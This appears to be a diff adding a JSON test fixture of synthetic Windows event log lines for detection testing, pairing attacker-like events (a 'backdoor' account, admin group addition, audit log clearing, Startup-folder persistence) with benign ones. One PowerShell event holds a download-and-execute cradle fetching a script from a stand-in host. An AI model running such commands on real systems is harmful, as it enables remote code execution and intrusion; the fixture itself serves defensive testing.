@@ -1,0 +1,70 @@
+{
+  "captured_with": "schema-derived (Microsoft/Sysmon EventData Data names), Alloy loki.source.windowsevent format v1.20.1 — re-capture from lab VM when available",
+  "cases": [
+    {
+      "name": "4625_failed_logon",
+      "channel": "Security",
+      "line": "{\"source\": \"Microsoft-Windows-Security-Auditing\", \"channel\": \"Security\", \"computer\": \"WIN11-LAB\", \"event_id\": 4625, \"levelText\": \"Information\", \"timeCreated\": \"2022-01-24T04:37:40.000000000Z\", \"eventRecordID\": 104625, \"message\": \"An account failed to log on.\", \"event_data\": \"<Data Name=\\\"SubjectUserSid\\\">S-1-5-18</Data><Data Name=\\\"TargetUserName\\\">administrator</Data><Data Name=\\\"TargetDomainName\\\">WIN11-LAB</Data><Data Name=\\\"Status\\\">0xc000006d</Data><Data Name=\\\"SubStatus\\\">0xc000006a</Data><Data Name=\\\"LogonType\\\">3</Data><Data Name=\\\"IpAddress\\\">203.0.113.7</Data><Data Name=\\\"IpPort\\\">51082</Data><Data Name=\\\"WorkstationName\\\">KALI</Data>\"}"
+    },
+    {
+      "name": "4740_account_lockout",
+      "channel": "Security",
+      "line": "{\"source\": \"Microsoft-Windows-Security-Auditing\", \"channel\": \"Security\", \"computer\": \"WIN11-LAB\", \"event_id\": 4740, \"levelText\": \"Information\", \"timeCreated\": \"2022-01-24T04:37:40.000000000Z\", \"eventRecordID\": 104740, \"message\": \"A user account was locked out.\", \"event_data\": \"<Data Name=\\\"TargetUserName\\\">jdoe</Data><Data Name=\\\"TargetDomainName\\\">WIN11-LAB</Data><Data Name=\\\"TargetSid\\\">S-1-5-21-111-222-333-1105</Data><Data Name=\\\"SubjectUserName\\\">WIN11-LAB$</Data><Data Name=\\\"CallerComputerName\\\">WIN11-LAB</Data>\"}"
+    },
+    {
+      "name": "4720_account_created",
+      "channel": "Security",
+      "line": "{\"source\": \"Microsoft-Windows-Security-Auditing\", \"channel\": \"Security\", \"computer\": \"WIN11-LAB\", \"event_id\": 4720, \"levelText\": \"Information\", \"timeCreated\": \"2022-01-24T04:37:40.000000000Z\", \"eventRecordID\": 104720, \"message\": \"A user account was created.\", \"event_data\": \"<Data Name=\\\"TargetUserName\\\">backdoor</Data><Data Name=\\\"TargetDomainName\\\">WIN11-LAB</Data><Data Name=\\\"SubjectUserName\\\">attacker</Data><Data Name=\\\"SubjectUserSid\\\">S-1-5-21-111-222-333-500</Data><Data Name=\\\"SamAccountName\\\">backdoor</Data>\"}"
+    },
+    {
+      "name": "4732_added_to_administrators",
+      "channel": "Security",
+      "line": "{\"source\": \"Microsoft-Windows-Security-Auditing\", \"channel\": \"Security\", \"computer\": \"WIN11-LAB\", \"event_id\": 4732, \"levelText\": \"Information\", \"timeCreated\": \"2022-01-24T04:37:40.000000000Z\", \"eventRecordID\": 104732, \"message\": \"A member was added to a security-enabled local group.\", \"event_data\": \"<Data Name=\\\"MemberName\\\">-</Data><Data Name=\\\"MemberSid\\\">S-1-5-21-111-222-333-1106</Data><Data Name=\\\"TargetUserName\\\">Administrators</Data><Data Name=\\\"TargetSid\\\">S-1-5-32-544</Data><Data Name=\\\"SubjectUserName\\\">attacker</Data>\"}"
+    },
+    {
+      "name": "4732_added_to_users_benign",
+      "channel": "Security",
+      "line": "{\"source\": \"Microsoft-Windows-Security-Auditing\", \"channel\": \"Security\", \"computer\": \"WIN11-LAB\", \"event_id\": 4732, \"levelText\": \"Information\", \"timeCreated\": \"2022-01-24T04:37:40.000000000Z\", \"eventRecordID\": 104732, \"message\": \"A member was added to a security-enabled local group.\", \"event_data\": \"<Data Name=\\\"MemberName\\\">-</Data><Data Name=\\\"MemberSid\\\">S-1-5-21-111-222-333-1107</Data><Data Name=\\\"TargetUserName\\\">Users</Data><Data Name=\\\"TargetSid\\\">S-1-5-32-545</Data><Data Name=\\\"SubjectUserName\\\">SYSTEM</Data>\"}"
+    },
+    {
+      "name": "1102_audit_log_cleared",
+      "channel": "Security",
+      "line": "{\"source\": \"Microsoft-Windows-Security-Auditing\", \"channel\": \"Security\", \"computer\": \"WIN11-LAB\", \"event_id\": 1102, \"levelText\": \"Information\", \"timeCreated\": \"2022-01-24T04:37:40.000000000Z\", \"eventRecordID\": 101102, \"message\": \"The audit log was cleared.\", \"user_data\": \"<LogFileCleared xmlns=\\\"http://manifests.microsoft.com/win/2004/08/windows/eventlog\\\"><SubjectUserSid>S-1-5-21-111-222-333-500</SubjectUserSid><SubjectUserName>attacker</SubjectUserName><SubjectDomainName>WIN11-LAB</SubjectDomainName><SubjectLogonId>0x3e7</SubjectLogonId></LogFileCleared>\"}"
+    },
+    {
+      "name": "4624_logon_benign",
+      "channel": "Security",
+      "line": "{\"source\": \"Microsoft-Windows-Security-Auditing\", \"channel\": \"Security\", \"computer\": \"WIN11-LAB\", \"event_id\": 4624, \"levelText\": \"Information\", \"timeCreated\": \"2022-01-24T04:37:40.000000000Z\", \"eventRecordID\": 104624, \"message\": \"An account was successfully logged on.\", \"event_data\": \"<Data Name=\\\"TargetUserName\\\">jdoe</Data><Data Name=\\\"TargetDomainName\\\">WIN11-LAB</Data><Data Name=\\\"LogonType\\\">2</Data><Data Name=\\\"IpAddress\\\">127.0.0.1</Data>\"}"
+    },
+    {
+      "name": "4104_scriptblock_suspicious",
+      "channel": "Microsoft-Windows-PowerShell/Operational",
+      "line": "{\"source\": \"Microsoft-Windows-PowerShell/Operational\", \"channel\": \"Microsoft-Windows-PowerShell/Operational\", \"computer\": \"WIN11-LAB\", \"event_id\": 4104, \"levelText\": \"Warning\", \"timeCreated\": \"2022-01-24T04:37:40.000000000Z\", \"eventRecordID\": 104104, \"message\": \"Creating Scriptblock text (1 of 1):\", \"event_data\": \"<Data Name=\\\"MessageNumber\\\">1</Data><Data Name=\\\"MessageTotal\\\">1</Data><Data Name=\\\"ScriptBlockText\\\">IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.7/a.ps1')</Data><Data Name=\\\"ScriptBlockId\\\">a1b2c3d4-0000-0000-0000-000000000001</Data><Data Name=\\\"Path\\\"></Data>\"}"
+    },
+    {
+      "name": "4104_scriptblock_benign",
+      "channel": "Microsoft-Windows-PowerShell/Operational",
+      "line": "{\"source\": \"Microsoft-Windows-PowerShell/Operational\", \"channel\": \"Microsoft-Windows-PowerShell/Operational\", \"computer\": \"WIN11-LAB\", \"event_id\": 4104, \"levelText\": \"Information\", \"timeCreated\": \"2022-01-24T04:37:40.000000000Z\", \"eventRecordID\": 104104, \"message\": \"Creating Scriptblock text (1 of 1):\", \"event_data\": \"<Data Name=\\\"MessageNumber\\\">1</Data><Data Name=\\\"MessageTotal\\\">1</Data><Data Name=\\\"ScriptBlockText\\\">Get-ChildItem C:\\\\Users | Sort-Object Name</Data><Data Name=\\\"ScriptBlockId\\\">a1b2c3d4-0000-0000-0000-000000000002</Data><Data Name=\\\"Path\\\"></Data>\"}"
+    },
+    {
+      "name": "sysmon1_process_create",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "line": "{\"source\": \"Microsoft-Windows-Sysmon/Operational\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"computer\": \"WIN11-LAB\", \"event_id\": 1, \"levelText\": \"Information\", \"timeCreated\": \"2022-01-24T04:37:40.000000000Z\", \"eventRecordID\": 100001, \"message\": \"Process Create:\", \"event_data\": \"<Data Name=\\\"RuleName\\\">-</Data><Data Name=\\\"UtcTime\\\">2022-01-24 04:37:40.123</Data><Data Name=\\\"ProcessId\\\">6120</Data><Data Name=\\\"Image\\\">C:\\\\Windows\\\\System32\\\\whoami.exe</Data><Data Name=\\\"CommandLine\\\">whoami /all</Data><Data Name=\\\"User\\\">WIN11-LAB\\\\jdoe</Data><Data Name=\\\"ParentImage\\\">C:\\\\Windows\\\\System32\\\\cmd.exe</Data><Data Name=\\\"ParentCommandLine\\\">cmd.exe /c whoami</Data>\"}"
+    },
+    {
+      "name": "sysmon3_network_connect",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "line": "{\"source\": \"Microsoft-Windows-Sysmon/Operational\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"computer\": \"WIN11-LAB\", \"event_id\": 3, \"levelText\": \"Information\", \"timeCreated\": \"2022-01-24T04:37:40.000000000Z\", \"eventRecordID\": 100003, \"message\": \"Network connection detected:\", \"event_data\": \"<Data Name=\\\"RuleName\\\">-</Data><Data Name=\\\"UtcTime\\\">2022-01-24 04:38:00.000</Data><Data Name=\\\"ProcessId\\\">6120</Data><Data Name=\\\"Image\\\">C:\\\\Windows\\\\System32\\\\rundll32.exe</Data><Data Name=\\\"User\\\">WIN11-LAB\\\\jdoe</Data><Data Name=\\\"Protocol\\\">tcp</Data><Data Name=\\\"SourceIp\\\">10.0.0.50</Data><Data Name=\\\"SourcePort\\\">50512</Data><Data Name=\\\"DestinationIp\\\">203.0.113.7</Data><Data Name=\\\"DestinationPort\\\">443</Data><Data Name=\\\"DestinationHostname\\\">-</Data>\"}"
+    },
+    {
+      "name": "sysmon11_file_create_startup",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "line": "{\"source\": \"Microsoft-Windows-Sysmon/Operational\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"computer\": \"WIN11-LAB\", \"event_id\": 11, \"levelText\": \"Information\", \"timeCreated\": \"2022-01-24T04:37:40.000000000Z\", \"eventRecordID\": 100011, \"message\": \"File created:\", \"event_data\": \"<Data Name=\\\"RuleName\\\">-</Data><Data Name=\\\"UtcTime\\\">2022-01-24 04:39:00.000</Data><Data Name=\\\"ProcessId\\\">6120</Data><Data Name=\\\"Image\\\">C:\\\\Windows\\\\System32\\\\cmd.exe</Data><Data Name=\\\"TargetFilename\\\">C:\\\\Users\\\\jdoe\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\run.bat</Data><Data Name=\\\"CreationUtcTime\\\">2022-01-24 04:39:00.000</Data>\"}"
+    },
+    {
+      "name": "sysmon11_file_create_benign",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "line": "{\"source\": \"Microsoft-Windows-Sysmon/Operational\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"computer\": \"WIN11-LAB\", \"event_id\": 11, \"levelText\": \"Information\", \"timeCreated\": \"2022-01-24T04:37:40.000000000Z\", \"eventRecordID\": 100011, \"message\": \"File created:\", \"event_data\": \"<Data Name=\\\"RuleName\\\">-</Data><Data Name=\\\"UtcTime\\\">2022-01-24 04:39:10.000</Data><Data Name=\\\"ProcessId\\\">7000</Data><Data Name=\\\"Image\\\">C:\\\\Program Files\\\\app\\\\app.exe</Data><Data Name=\\\"TargetFilename\\\">C:\\\\Users\\\\jdoe\\\\Documents\\\\report.docx</Data><Data Name=\\\"CreationUtcTime\\\">2022-01-24 04:39:10.000</Data>\"}"
+    }
+  ]
+}
